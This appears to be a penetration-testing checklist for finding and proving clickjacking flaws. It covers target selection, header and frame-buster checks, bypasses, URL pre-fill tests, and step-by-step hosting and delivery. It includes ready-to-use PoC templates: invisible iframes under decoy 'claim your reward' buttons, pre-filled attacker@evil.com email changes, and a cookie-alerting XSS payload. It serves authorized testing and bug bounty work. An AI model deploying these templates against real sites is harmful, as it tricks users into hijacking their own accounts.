
# Clickjacking Testing Checklist

> **Phase:** Post-recon. Traffic is captured. You are logged in as a test user with a valid session.

---

## Step 1 — Identify State-Changing Authenticated Actions

Walk the application and flag every page or endpoint that performs one of the following. These are your test targets.

### Account & Profile
- [ ] Change email address
- [ ] Change password
- [ ] Change username / display name
- [ ] Change phone number
- [ ] Update profile picture / avatar
- [ ] Change date of birth
- [ ] Change physical address
- [ ] Change language / region / timezone
- [ ] Delete profile / personal data

### Security Settings
- [ ] Enable / disable two-factor authentication (2FA)
- [ ] Add / remove trusted devices
- [ ] Change security questions or answers
- [ ] Change recovery email or recovery phone
- [ ] Revoke all active sessions / sign out everywhere
- [ ] View or rotate backup codes

### Financial & Billing
- [ ] Add / remove payment method (card, bank account)
- [ ] Change default payment method
- [ ] Change billing address
- [ ] Make a purchase or initiate a payment
- [ ] Transfer / withdraw funds
- [ ] Cancel subscription
- [ ] Upgrade / downgrade plan
- [ ] Redeem a coupon or gift card

### Access & Permissions
- [ ] Invite users to an account / organisation
- [ ] Remove users from an account / organisation
- [ ] Change a user's role or permissions
- [ ] Grant / revoke admin access
- [ ] Accept or decline an invitation

### Connected Services & OAuth
- [ ] Connect / disconnect a third-party OAuth application
- [ ] Authorise a third-party app
- [ ] Revoke a third-party app's access
- [ ] Link / unlink a social account (Google, GitHub, etc.)

### API & Developer Settings
- [ ] Generate an API key or token
- [ ] Revoke / delete an API key or token
- [ ] Create / delete a webhook
- [ ] Create / delete an SSH key or GPG key

### Content & Data
- [ ] Submit a form that stores user-supplied data (feedback, contact, reviews)
- [ ] Delete a post, file, or user-generated content item
- [ ] Change privacy settings (public / private account)
- [ ] Request a data export
- [ ] Request account deletion

### Communication Preferences
- [ ] Subscribe / unsubscribe from email notifications
- [ ] Change notification preferences
- [ ] Opt in / out of marketing communications

> For each flagged action, note: the URL, HTTP method, whether a CSRF token is present, and whether the action completes in one step or requires a confirmation.

---

## Step 2 — Check Framing Protection on Each Target Page

Run all three checks for every target page identified in Step 1.

### 2a — X-Frame-Options Header
- [ ] Load the target page and inspect the response headers in Burp
- [ ] Flag as **potentially vulnerable** if the header is **absent** or set to `ALLOWALL`
- [ ] Flag as **protected** (but still test bypass) if set to `DENY` or `SAMEORIGIN`

```http
X-Frame-Options: DENY         ← protected
X-Frame-Options: SAMEORIGIN   ← protected
                              ← missing = potentially vulnerable
```

### 2b — Content-Security-Policy: frame-ancestors
- [ ] Check the `Content-Security-Policy` response header for a `frame-ancestors` directive
- [ ] Flag as **protected** if `frame-ancestors 'none'` or `frame-ancestors 'self'` is present
- [ ] Flag as **misconfigured** if `frame-ancestors *` or absent entirely
- [ ] Note: `frame-ancestors` overrides `X-Frame-Options` in all modern browsers — if both are present, only `frame-ancestors` matters

```http
Content-Security-Policy: frame-ancestors 'none'     ← protected
Content-Security-Policy: frame-ancestors 'self'     ← protected
Content-Security-Policy: frame-ancestors *          ← vulnerable
                                                    ← missing = check XFO
```

### 2c — JavaScript Frame Buster in Page Source
- [ ] View the page source and search for frame buster patterns:
  - `top !== self`
  - `top.location`
  - `window.top`
  - `self === top`
  - `parent.location`
- [ ] If found, note the exact logic — it determines which bypass to attempt in Step 3

> If **none** of the three protections are present → the page is frameable. Move directly to Step 5 (URL pre-fill) and Step 7 (PoC).

---

## Step 3 — Test Frame Buster Bypasses

Only run if a protection was found in Step 2. Try bypasses in the order listed.

### 3a — sandbox="allow-forms" (JS frame buster bypass)
Disables JavaScript entirely inside the iframe, killing the frame buster, while still allowing form submissions.

- [ ] Attempt to frame the target page with:

```html
<iframe sandbox="allow-forms" src="https://target.com/sensitive-action"></iframe>
```

- [ ] Confirm bypass if the page loads and the form/button is interactable

### 3b — sandbox with scripts permitted (partial buster bypass)
Some frame busters attempt `top.location = self.location` to redirect the parent. The `sandbox` attribute blocks cross-origin navigation even when scripts are allowed, so the redirect fails silently.

- [ ] Try if `allow-forms` alone breaks the page (e.g. the action requires JS to submit):

```html
<iframe sandbox="allow-forms allow-scripts allow-same-origin" src="https://target.com/sensitive-action"></iframe>
```

- [ ] Confirm bypass if the frame buster's redirect is blocked while the form still functions

### 3c — Double-framing (legacy frame buster bypass)
Frame busters that check `top !== self` and redirect `top.location` can be trapped by a middle frame that catches the navigation. Less effective in modern browsers but worth attempting.

- [ ] Nest the target inside two iframes:

```html
<!-- Outer frame (attacker page) -->
<iframe src="middle.html"></iframe>

<!-- middle.html -->
<iframe src="https://target.com/sensitive-action"></iframe>
```

- [ ] Confirm bypass if the target loads without redirecting

### 3d — X-Frame-Options / CSP misconfiguration
- [ ] If `X-Frame-Options: SAMEORIGIN` is set but no `frame-ancestors` CSP exists, test from the same origin (e.g. if the target has a user-controlled subdomain or an open redirect to a same-site page)
- [ ] If `frame-ancestors` lists specific origins, check if any trusted origin is also attacker-controllable (e.g. an open redirect, a subdomain with XSS)

---

## Step 4 — Test URL Parameter Pre-fill

A clickjacking attack against a form is only practical if you can pre-populate the fields so the victim just needs to click — not type. Test every target form for this.

- [ ] View the page source and note the `name` attribute of every input field in the target form
- [ ] Test each field by appending it as a URL parameter:

```
https://target.com/account?email=attacker@evil.com
https://target.com/account?new_password=hacked123
https://target.com/settings?phone=+15555555555
```

- [ ] Confirm pre-fill if the input field is populated when the page loads with the parameter
- [ ] Note which fields can be pre-filled — this directly determines the impact of the attack

---

## Step 5 — Identify Multi-Step Flows

Some sensitive actions require the victim to click twice (e.g. an action button + a "Are you sure?" confirmation). These need a different PoC structure.

- [ ] Complete the target action manually and observe whether a confirmation dialog, modal, or second page appears
- [ ] If yes, identify the position of **both** click targets
- [ ] Note: multi-step flows require two overlaid decoy elements in the PoC (see Step 7)

---

## Step 6 — DOM-Based XSS Escalation via Clickjacking

Use this when a self-XSS exists that cannot be triggered directly but can be delivered by tricking the victim into clicking.

- [ ] Identify any form on the site where user input is reflected in the page after submission (feedback, contact, review, name fields, etc.)
- [ ] Confirm the self-XSS by submitting a payload like `<img src=1 onerror=alert(1)>` and verifying it executes **only for you**
- [ ] Test if the XSS payload can be pre-populated via URL parameters (see Step 4)
- [ ] Test if the result is rendered on the same page after submission (anchor the URL with `#resultAnchor` to scroll the iframe to the right position)
- [ ] If all three are true → escalate with the DOM XSS payload in Step 7

---

## Step 7 — Build the PoC

Use the appropriate template based on what you found above. Replace `top`, `left` values by loading the exploit page with `opacity: 0.5` first, aligning the decoy button over the target, then setting opacity to `0.0001` before delivering.

### Basic one-click (no pre-fill)

```html
<style>
  iframe {
    position: relative;
    width: 1000px;
    height: 1000px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 500px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click here to claim your reward</div>
<iframe src="https://target.com/sensitive-action"></iframe>
```

### One-click with URL pre-fill

```html
<style>
  iframe {
    position: relative;
    width: 1000px;
    height: 1000px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 470px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click here to claim your reward</div>
<iframe src="https://target.com/account?email=attacker@evil.com"></iframe>
```

### Frame buster bypass (sandbox)

```html
<style>
  iframe {
    position: relative;
    width: 1000px;
    height: 1000px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 470px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click here to claim your reward</div>
<iframe sandbox="allow-forms"
  src="https://target.com/account?email=attacker@evil.com"></iframe>
```

### Multi-step (two clicks)

```html
<style>
  iframe {
    position: relative;
    width: 1000px;
    height: 1000px;
    opacity: 0.0001;
    z-index: 2;
  }
  .first, .second {
    position: absolute;
    z-index: 1;
  }
  .first  { top: 510px; left: 60px; }
  .second { top: 310px; left: 200px; }
</style>
<div class="first">Click here to claim your reward</div>
<div class="second">Click here to confirm</div>
<iframe src="https://target.com/sensitive-action"></iframe>
```

### DOM-based XSS escalation

```html
<style>
  iframe {
    position: relative;
    width: 1000px;
    height: 900px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 815px;
    left: 40px;
    z-index: 1;
  }
</style>
<div>Click here to claim your reward</div>
<iframe src="https://target.com/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=x@x.com&subject=x&message=x#feedbackResult"></iframe>
```

---

## Step 8 — Host and Deliver the PoC

Unlike a lab environment, you need to host the PoC yourself and deliver a link to the victim.

### Hosting options

**Python HTTP server (quick local test)**
```bash
# Save your PoC as index.html in a directory, then:
python3 -m http.server 8080
```

**Ngrok (expose local server publicly)**
```bash
ngrok http 8080
# Use the generated https://xxxxx.ngrok.io URL as your delivery link
```

**VPS / cloud server**
```bash
# Copy PoC to your server and serve with nginx or python
scp index.html user@your-vps:/var/www/html/poc.html
```

### Delivery
- [ ] Confirm the PoC works from the hosted URL in your own browser first (logged in as the test user)
- [ ] The delivery URL should look convincing — consider path names like `/win`, `/verify`, `/confirm`
- [ ] For bug bounty reports, record a screen capture showing the attack completing end-to-end

---

## Notes

<!-- Add target-specific findings, endpoint URLs, PoC adjustments, and observations here -->
